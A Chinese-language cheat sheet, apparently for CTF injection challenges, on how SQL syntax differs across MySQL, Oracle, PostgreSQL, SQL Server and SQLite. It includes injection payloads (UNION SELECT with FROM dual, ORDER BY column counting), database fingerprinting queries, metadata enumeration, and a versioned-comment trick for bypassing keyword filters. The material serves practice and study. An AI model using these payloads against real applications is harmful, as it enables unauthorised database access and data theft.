# 各数据库语法差异速查

> 做注入题最容易被"换了个数据库就失败"卡住。这份表是按实际踩坑整理的 —— **同一个操作，不同数据库写法不同**。

## 一、注释符（最容易踩的坑）

| 数据库 | 行注释 | 块注释 | 关键要求 |
|---|---|---|---|
| **MySQL** | `#注释` 或 `-- 注释` | `/*注释*/` | **`--` 后面必须跟至少一个空白字符**（空格/制表符/换行）。裸 `--` 不是注释 |
| Oracle | `--注释` | `/*注释*/` | `--` 后面**不需要**空格 |
| PostgreSQL | `--注释` | `/*注释*/` | 同上 |
| SQL Server | `--注释` | `/*注释*/` | 同上 |

**URL 场景的两个坑：**

- **末尾空格会被吞** → 用 `--+`（`+` 在 query string 里解码为空格）
- **`#` 是 URL 片段分隔符** → 浏览器不会把 `#` 及其后内容发给服务器。地址栏里必须写 **`%23`**；**Burp Repeater / 原始请求**里可以直接写 `#`

**稳妥策略**：不确定库类型时用 `/* */` —— 两边都不需要空格，四大数据库通吃。

**注**：MySQL 还支持版本化注释 `/*! ... */`，里面的内容会被执行（可用于绕过关键字过滤）。

## 二、数据库版本

| 数据库 | 查询 |
|---|---|
| Oracle | `SELECT banner FROM v$version` / `SELECT version FROM v$instance` |
| Microsoft / MySQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |

**哪种写法能跑通，就说明对面是什么库** —— 版本查询也是数据库指纹。

## 三、元数据枚举（列表 / 列列）

| 数据库 | 列出表 | 列出列 |
|---|---|---|
| MySQL / PostgreSQL / SQL Server | `information_schema.tables` | `information_schema.columns WHERE table_name='x'` |
| **Oracle** | **`all_tables`** | **`all_tab_columns WHERE table_name='X'`** |
| SQLite | `sqlite_master WHERE type='table'` | `PRAGMA table_info(表名)` |

**Oracle 注意**：没有 `information_schema`；表名/列名通常**大写**（未加引号的标识符默认转大写存储）。

## 四、`FROM dual`（Oracle 专属）

Oracle 要求每条 `SELECT` 都指定数据源。**不查实际表时**必须写 `FROM dual`：

```sql
' UNION SELECT NULL,NULL FROM dual--
```

如果 `FROM` 后面是真实存在的表（如 `all_tables`），就不需要 `dual`。

## 五、字符串拼接

| 数据库 | 写法 |
|---|---|
| Oracle / PostgreSQL | `'foo'\|\|'bar'` |
| Microsoft | `'foo'+'bar'` |
| MySQL | `CONCAT('foo','bar')` 或 `'foo' 'bar'`（**中间有空格**） |

## 六、取子串

`SUBSTR('foobar',4,2)` / `SUBSTRING('foobar',4,2)` —— **下标从 1 开始**（不是 0）。

| 数据库 | 函数名 |
|---|---|
| Oracle | `SUBSTR` |
| MySQL / PostgreSQL / SQL Server | `SUBSTRING`（MySQL 也支持 `SUBSTR`） |

## 七、把多行挤成一格（单回显位时用）

| 数据库 | 写法 |
|---|---|
| MySQL | `group_concat(col)` |
| SQL Server | `string_agg(col, ',')` |
| Oracle | `listagg(col, ',')` |
| PostgreSQL | `string_agg(col, ',')` |

## 八、判断列数

```sql
' ORDER BY 1--        递增，直到报错；报错前的数字 = 列数
' UNION SELECT NULL-- 递增 NULL，直到不报错
```

`NULL` 与任何类型兼容，所以递增 `NULL` 时**报错只反映列数**，不受类型干扰。

## 九、经验总结

1. **先读题目横幅** —— 它写死了判定标准。目标读错，技术再对也没用
2. **注释符失败时先想"是不是库不对"** —— 注释符差异本身是数据库指纹
3. **换库先换语法** —— `--` → `#`/`%23`，`information_schema` → `all_tables`，记得 Oracle 要大写、要 `dual`
4. **不确定时用 `/* */`** —— 最通用的注释
